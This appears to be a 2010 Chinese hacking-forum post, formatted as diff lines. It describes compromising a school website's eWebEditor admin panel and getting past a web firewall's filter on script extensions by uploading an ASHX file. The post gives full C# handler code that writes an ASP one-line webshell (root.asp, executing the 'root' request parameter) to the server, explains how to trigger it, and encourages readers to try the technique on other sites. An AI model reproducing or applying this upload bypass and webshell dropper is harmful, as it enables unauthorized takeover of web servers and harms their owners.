@@ -1,0 +1,77 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+上传，别忘记ashx!
+D8888D主贴内容-------------------------------------------------------
+ 
+
+By :Root , QQ:24162807
+
+转载请注明以上
+
+   前两天帮朋友搞个edu,，运气不错下了eweb默认数据库进了后台，可以添加上传样式
+
+上传的格式asa ,cer,cdx 等都可以添加但是传文件的时候就卡主不动了，当时想应该装什么
+
+鸟web防火墙了（后来拿下服务器确实过滤了asa,cer,cdx,htr,aspx,php,jsp 等脚本）。
+
+   突破的办法是什么呢，今天论坛看见icysun ，发帖问 过滤常见脚本怎么突破。先来上图
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1008/1008021507ddefaeec0ebd267c.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NzkyNXxiOGZlNGYzOHwxMjg2NDc5NTYzfDU0MjlZd3JYRzVYblhESm1LaXZRM3VPNmtUc0grQkxWbXNTQlRGQlNKVGY1K3FZ&nothumb=yes]链接标记下载[/url] (28.71 KB)
+
+2010-8-2 15:07
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1008/10080215047afeda490a1e22db.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NzkyMXwxODY4ZTc1MnwxMjg2NDc5NTYzfDU0MjlZd3JYRzVYblhESm1LaXZRM3VPNmtUc0grQkxWbXNTQlRGQlNKVGY1K3FZ&nothumb=yes]链接标记下载[/url] (43.4 KB)
+
+2010-8-2 15:04
+
+常见的脚本都过滤了 除PHP ，JSP倒是没有过滤，可惜不支持PHP JSP解析。
+
+  这里我们还可以添加一个ashx 脚本类型。用ashx来写一个asp的一句话到当前目录。
+
+代码如下。
+
+<%@ WebHandler Language="C#" Class="Handler" %>
+
+using System;
+using System.Web;
+using System.IO;
+public class Handler : IHttpHandler {
+    
+    public void ProcessRequest (HttpContext context) {
+        context.Response.ContentType = "text/plain";
+        
+        StreamWriter file1= File.CreateText(context.Server.MapPath("root.asp"));
+        file1.Write("<%response.clear:execute request(\"root\"):response.End%>");
+        file1.Flush();
+        file1.Close();
+        
+    }
+
+    public bool IsReusable {
+        get {
+            return false;
+        }
+    }
+
+}
+
+保存为 ashx ，现在来添加一个 ashx 上传类型看看.
+
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1008/10080215072359b0baff5dd597.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NzkyNnw1MjVkNjhmOHwxMjg2NDc5NTYzfDU0MjlZd3JYRzVYblhESm1LaXZRM3VPNmtUc0grQkxWbXNTQlRGQlNKVGY1K3FZ&nothumb=yes]链接标记下载[/url] (30.7 KB)
+
+2010-8-2 15:07
+上传成功，直接访问 
+
+[url=http://www..xxxxx.com/]链接标记http://www..xxxxx.com/[/url] admin/eWebEditor/UploadFile/201082143554545.ashx 就会在当前目录生成一个
+
+root.asp的一句话木马。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1008/1008021507356ccbfb3df3c98e.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NzkyN3w2Yjc0Zjk4NXwxMjg2NDc5NTYzfDU0MjlZd3JYRzVYblhESm1LaXZRM3VPNmtUc0grQkxWbXNTQlRGQlNKVGY1K3FZ&nothumb=yes]链接标记下载[/url] (68.13 KB)
+
+2010-8-2 15:07
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_1008/1008021507622300a035b4abee.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=NzkyOHxhNTc2ZDNkNnwxMjg2NDc5NTYzfDU0MjlZd3JYRzVYblhESm1LaXZRM3VPNmtUc0grQkxWbXNTQlRGQlNKVGY1K3FZ&nothumb=yes]链接标记下载[/url] (34.13 KB)
+
+2010-8-2 15:07
+
+看上传文件里，root.asp 已经躺在那边了，用lake2的 一句话连接，看见亲切的hello word !  搞定手工了。
+
+有时候 网站过滤了常见的脚本类型却把 ashx给漏了，大家可以试试 ，菜鸟文章大牛见笑了。。
